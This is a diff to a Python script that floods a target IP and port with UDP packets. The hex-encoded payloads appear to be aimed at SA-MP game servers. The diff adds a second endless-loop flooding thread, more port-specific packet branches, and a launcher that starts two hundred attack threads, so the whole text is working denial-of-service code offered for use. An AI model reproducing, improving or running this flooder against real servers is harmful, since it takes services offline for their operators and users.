@@ -6,9 +6,6 @@ import random
 import time
 import os
 
-
-
-
 ip = sys.argv[1]
 port = sys.argv[2]
 orgip =ip
@@ -31,17 +28,46 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
 
 print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))
 
-            
-
-
-
-
-
 class MyThread(threading.Thread):
      def run(self):
          while True:
                 sock = socket.socket(
-                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))    
+
+
+class MyThread1(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
                      
@@ -62,12 +88,25 @@ class MyThread(threading.Thread):
                 elif(int(port) == 7784):
                     sock.sendto(Pacotes[7], (ip, int(port)))
                 elif(int(port) == 1111):
-                    sock.sendto(Pacotes[9], (ip, int(port)))    
-                
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+                elif(int(port) == 2023):
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                elif(int(port) == 7776):
+                    sock.sendto(Pacotes[10], (ip, int(port)))
 
+		
 if __name__ == '__main__':
     try:
      for x in range(100):                                    
-            mythread = MyThread()  
-            mythread.start()                                  
-            time.sleep(.1)
+            mythread = MyThread()
+            mythread1 = MyThread1()
+            mythread1.start()
+            mythread.start()
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+         print("Close")
+         pass
